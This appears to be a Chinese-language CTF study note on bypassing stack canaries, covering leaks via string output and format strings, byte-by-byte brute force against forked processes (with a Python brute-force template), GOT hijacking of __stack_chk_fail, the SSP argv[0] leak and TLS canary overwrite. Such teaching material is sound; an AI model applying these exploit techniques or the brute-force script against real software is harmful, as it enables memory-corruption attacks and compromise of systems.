---
title: Canary绕过
date: '2025-05-11 22:37:40'
updated: '2025-09-20 17:23:50'
---
canary 是存放在函数栈 rbp-0x8 或 ebp-0x4 位置的数据，在函数开始时压入栈，

在函数返回前会检查它的值是否正确，如果被篡改就会调用__stack_chk_fail 函数

Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串

## 字符串输出带出
覆盖 canary 的最低字节，在打印栈上字符串时可以连着 canary 一同带出

但是要注意，换行符可能覆盖到了 canary 的最低字节，记得减去 0xa（换行符 ascii 码）

## 格式化字符串泄露
利用格式化字符串的偏移读取栈上的 canary

## 利用子进程爆破
程序 fork 出来的子进程的 canary 完全一致，

可以利用子进程爆破 canary，一个字节一个字节覆盖，报错则下一个

板子：

```python
offset=0x64
canary = b'\x00'
for i in range(3):
    for j in range(0,256):
        print("idx:"+str(i)+":"+chr(j))
        payload = b'a' * offset + canary + bytes([j])
        link.send(payload)
        sleep(0.3)
        text = link.recv()
        print(text)
        if (b"stack smashing detected" not in text):
            canary += bytes([j])
            print(b"Canary:" + canary)
            break
```

## 劫持__stack_chk_fail 函数
已知 Canary 失败的处理逻辑会进入到 __stack_chk_failed 函数，__stack_chk_failed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数

## Stack Smashing Protect Leak
其实就是利用canary的报错函数来实现任意读，libc版本得小于2.23（真挺少见的...）

__stack_chk_fail()函数定义：

```c
eglibc-2.19/debug/stack_chk_fail.c

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
    __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
    /* The loop is added only to keep gcc happy.  */
    while (1)
        __libc_message (2, "*** %s ***: %s terminatedn",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

在存在栈溢出的情况下，如果能够覆盖到栈上面的argv[0]，就可以打印出任意地址的内容了

这个argv[0]其实就是存着程序名的地址

## 覆盖 TLS 中储存的 Canary 值
已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。

